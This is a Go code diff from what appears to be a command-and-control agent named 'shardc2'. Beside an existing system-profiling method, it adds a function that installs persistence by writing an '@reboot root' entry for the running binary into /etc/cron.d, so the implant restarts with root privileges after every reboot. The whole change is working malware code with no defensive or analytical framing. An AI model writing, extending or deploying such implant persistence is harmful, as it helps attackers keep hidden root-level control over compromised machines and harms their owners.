@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"math/rand"
 	"net/http"
@@ -113,4 +114,11 @@ func (a *Agent) ProfileSystem() (*SystemProfile, error) {
 		Arch:     runtime.GOARCH,
 		User:     user,
 	}, nil
+}
+
+func (a *Agent) InstallPersistence() error {
+	// Add to cron for persistence
+	cronPath := "/etc/cron.d/shardc2"
+	cronEntry := fmt.Sprintf("@reboot root %s --daemon\n", os.Args[0])
+	return ioutil.WriteFile(cronPath, []byte(cronEntry), 0644)
 }
